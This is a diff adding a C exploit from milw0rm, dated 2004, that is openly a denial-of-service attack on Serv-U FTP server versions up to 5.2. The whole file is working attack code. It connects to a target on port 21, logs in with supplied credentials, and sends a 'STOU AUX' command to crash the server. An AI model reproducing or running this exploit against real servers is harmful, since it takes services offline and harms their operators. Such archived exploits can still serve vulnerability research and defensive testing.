@@ -1,0 +1,134 @@
+/*
+denial of service in Serv-u up to 5.2
+str0ke@milw0rm.com - www.milw0rm.com
+
+Advisory: http://www.securitytracker.com/alerts/2004/Sep/1011219.html
+
+Ya its useless.  
+
+*/
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#define SERVER_PORT 21
+usage(char *name)
+{
+printf("usage: %s -h hostname/ip -u user -p passwd\n",name);
+printf("\t\tstr0ke - Serv-U up to 5.2 Denial of Service\n");
+exit(0);
+}
+
+main(int argc, char *argv[]) {
+ char buffer[1000],host[255],user[255],pass[255],c;
+ int sd, rc, i=0;
+ struct sockaddr_in localAddr, servAddr;
+ struct hostent *h;
+
+if ( argc < 3) {
+usage(argv[0]);
+}
+
+while ((c = getopt (argc, argv, "h:u:p:")) != EOF)
+       switch(c)
+       {
+               case 'h':
+                       strncpy(host,optarg,sizeof(host));
+                       break;
+               case 'u':
+                       strncpy(user,optarg,sizeof(user));
+                       break;
+               case 'p':
+                       strncpy(pass,optarg,sizeof(pass));
+                       break;
+       }
+
+ h = gethostbyname(host);
+ if(h==NULL) {
+   printf("unknown host '%s'\n",host);
+   exit(1);
+ }
+
+ servAddr.sin_family = h->h_addrtype;
+ memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
+ servAddr.sin_port = htons(SERVER_PORT);
+ sd = socket(AF_INET, SOCK_STREAM, 0);
+ if(sd<0) {
+   perror("cannot open socket ");
+   exit(1);
+ }
+
+ localAddr.sin_family = AF_INET;
+ localAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+ localAddr.sin_port = htons(0);
+
+ rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));
+ if(rc<0) {
+   printf("%d: cannot bind port TCP %u\n",sd,SERVER_PORT);
+   perror("error ");
+   exit(1);
+ }
+
+ printf("Trying To Connect To [%s]\n",host);
+ rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
+ if(rc<0) {
+   perror("cannot connect ");
+   exit(1);
+ }
+   printf("Trying Login With [%s]\n",user);
+   snprintf(buffer,sizeof(buffer), "USER %s\r\n", user);
+   rc = send(sd, buffer, strlen(buffer), 0);
+   memset(buffer,0,sizeof(buffer));
+while(1)
+       {
+       rc=recv(sd,buffer,sizeof(buffer),0);
+       if(strstr(buffer,"331")) break;
+       if(strstr(buffer,"421"))
+               {
+               printf("Access Denied on your arse..\n");
+               exit(0);
+               }
+       }
+
+   printf("Sending Pass - [%s]\n",pass);
+   memset(buffer,0,sizeof(buffer));
+   snprintf(buffer,sizeof(buffer), "PASS %s\r\n", pass);
+   rc = send(sd,buffer, strlen(buffer), 0);
+
+while(1)
+       {
+       rc=recv(sd,buffer,sizeof(buffer),0);
+       if(strstr(buffer,"230")) break;
+       if(strstr(buffer,"421"))
+               {
+               printf("Access Denied on your arse..\n");
+               exit(0);
+               }
+
+       if(strstr(buffer,"530"))
+               {
+               printf("Access Denied: Login Incorrect!\n");
+               exit(0);
+               }
+}
+
+   memset(buffer,0,sizeof(buffer));
+   snprintf(buffer,sizeof(buffer), "STOU AUX\r\n");
+   rc = send(sd,buffer, strlen(buffer), 0);
+
+   printf("Dos Sent\n");
+
+   if(rc<0) {
+     perror("cannot send data ");
+     close(sd);
+     exit(1);
+   }
+return 0;
+}
+
+// milw0rm.com [2004-09-13]
